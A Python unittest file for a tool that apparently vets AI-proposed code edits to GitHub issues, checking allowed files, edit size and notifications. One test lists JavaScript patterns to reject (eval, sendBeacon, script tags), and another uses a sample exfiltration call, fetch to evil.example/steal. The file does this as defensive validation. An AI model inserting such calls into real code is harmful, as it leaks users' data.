import unittest

from scripts import ki_issue as ki

FILES = {"app.js": "const a = 1;\nconst b = 2;\nconst url = 'https://example.org/x';\n"}


class ParseTest(unittest.TestCase):
    def test_plain_and_fenced_json(self):
        self.assertEqual(ki.parse_json_text('{"a": 1}'), {"a": 1})
        self.assertEqual(ki.parse_json_text('```json\n{"a": 1}\n```'), {"a": 1})

    def test_not_an_object_is_rejected(self):
        with self.assertRaises(ValueError):
            ki.parse_json_text("[1, 2]")

    def test_mentions_are_defused(self):
        self.assertNotIn("@x", ki.clean_text("hallo @x", 50))


class TriageTest(unittest.TestCase):
    def test_unknown_values_are_normalized(self):
        plan = ki.normalize_triage({"art": "unsinn", "aufwand": "riesig", "umsetzbar": True, "dateien": ["app.js", "evil.js", ".github/workflows/x.yml"]})
        self.assertEqual((plan["art"], plan["aufwand"], plan["umsetzbar"], plan["dateien"]), ("sonstiges", "gross", False, ["app.js"]))

    def test_small_change_in_allowed_file_is_doable(self):
        plan = ki.normalize_triage({"art": "wunsch", "aufwand": "klein", "umsetzbar": True, "dateien": ["style.css"]})
        self.assertTrue(plan["umsetzbar"])

    def test_without_files_nothing_is_doable(self):
        self.assertFalse(ki.normalize_triage({"aufwand": "klein", "umsetzbar": True, "dateien": []})["umsetzbar"])


class EditsTest(unittest.TestCase):
    def edit(self, **kw):
        base = {"datei": "app.js", "suchen": "const a = 1;", "ersetzen": "const a = 2;"}
        base.update(kw)
        return [base]

    def test_valid_edit(self):
        edits = self.edit()
        self.assertEqual(ki.validate_edits(edits, FILES), [])
        self.assertIn("const a = 2;", ki.apply_edits(edits, FILES)["app.js"])

    def test_file_not_allowed_or_not_provided(self):
        self.assertTrue(ki.validate_edits(self.edit(datei=".github/workflows/tests.yml"), FILES))
        self.assertTrue(ki.validate_edits(self.edit(datei="sw.js"), FILES))

    def test_search_text_must_occur_exactly_once(self):
        self.assertTrue(ki.validate_edits(self.edit(suchen="const"), FILES))
        self.assertTrue(ki.validate_edits(self.edit(suchen="gibt es nicht"), FILES))

    def test_dangerous_code_is_rejected(self):
        for bad in ("eval('x')", "document.write('x')", "<script src=x>", "navigator.sendBeacon('x')", "new Function('x')"):
            self.assertTrue(ki.validate_edits(self.edit(ersetzen=bad), FILES), bad)

    def test_new_external_urls_are_rejected_but_existing_ones_allowed(self):
        self.assertTrue(ki.validate_edits(self.edit(ersetzen="fetch('https://evil.example/steal')"), FILES))
        known = self.edit(suchen="const b = 2;", ersetzen="const b = 'https://example.org/x';")
        self.assertEqual(ki.validate_edits(known, FILES), [])

    def test_too_many_lines_and_empty_list(self):
        self.assertTrue(ki.validate_edits(self.edit(ersetzen="\n" * 200), FILES))
        self.assertTrue(ki.validate_edits([], FILES))
        self.assertTrue(ki.validate_edits("kaputt", FILES))


class NotificationTest(unittest.TestCase):
    def test_pull_request(self):
        n = ki.notification({"issue": {"number": 7, "title": "Mehr Farben", "url": "u"}, "status": "pr", "pr_url": "https://x/pr/1", "zusammenfassung": "Farben"})
        self.assertEqual(n["click"], "https://x/pr/1")
        self.assertIn("#7", n["title"])

    def test_direct_push_counts_as_done(self):
        n = ki.notification({"issue": {"number": 5, "title": "t", "url": "u"}, "status": "direkt"})
        self.assertEqual(n["title"], "KI-Vorschlag für #5")
        self.assertIn("dev", n["message"])

    def test_foreign_issue_and_failure(self):
        foreign = ki.notification({"issue": {"number": 8, "title": "t", "url": "u", "author": "fremd"}, "status": "fremd"})
        self.assertIn("fremd", foreign["message"])
        self.assertIn("nicht erreichbar", ki.notification({"issue": {"number": 9}, "status": "ki-fehler", "grund": "429"})["message"])


if __name__ == "__main__":
    unittest.main()
